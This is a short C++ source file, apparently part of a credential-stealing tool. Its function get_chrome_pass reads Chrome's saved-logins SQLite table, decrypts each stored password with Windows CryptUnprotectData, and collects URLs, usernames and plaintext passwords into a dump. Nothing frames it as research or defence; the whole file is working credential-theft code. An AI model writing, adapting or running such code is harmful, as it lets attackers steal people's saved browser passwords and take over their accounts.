#include "tools.h"

std::stringstream get_chrome_pass(sqlite3* db)
{
    std::string sql = "SELECT action_url, username_value, password_value FROM logins";

    std::stringstream dump(std::string(""));
    sqlite3_stmt *pStmt;
    int rc;
    rc = sqlite3_prepare(db, sql.c_str(), -1, &pStmt, 0);
    if (rc != SQLITE_OK)
    {
        std::cout << "statement failed rc = " << rc << std::endl;
        return  std::stringstream();
    }
    std::cout << std::endl;

    rc = sqlite3_step(pStmt);
    //std::cout << "RC: " << rc << std::endl;
    while (rc == SQLITE_ROW) 
    {
        dump << sqlite3_column_text(pStmt, 0) << std::endl;
        dump << (char *)sqlite3_column_text(pStmt, 1) << std::endl;

        DATA_BLOB encryptedPass, decryptedPass;

        encryptedPass.cbData = (DWORD)sqlite3_column_bytes(pStmt, 2);
        encryptedPass.pbData = (byte *)malloc((int)encryptedPass.cbData);

        memcpy(encryptedPass.pbData, sqlite3_column_blob(pStmt, 2), (int)encryptedPass.cbData);

        CryptUnprotectData(
                &encryptedPass,
                NULL,
                NULL,
                NULL,
                NULL,
                0,
                &decryptedPass);
        char *password = (char *)decryptedPass.pbData;
        while (isprint(*password))
        {
            dump << *password;
            password++;
        }
                
        dump << std::endl;
        free(encryptedPass.pbData);
        rc = sqlite3_step(pStmt);
    }
    rc = sqlite3_finalize(pStmt);
    sqlite3_close(db);
    return dump;
}

int callback(void *NotUsed, int argc, char **argv, char **azColName)
{
    for(int i = 0; i < argc; i++) 
    {
        std::cout << azColName[i] << ": " << argv[i] << std::endl;
    }
    std::cout << std::endl;
    return 0;
}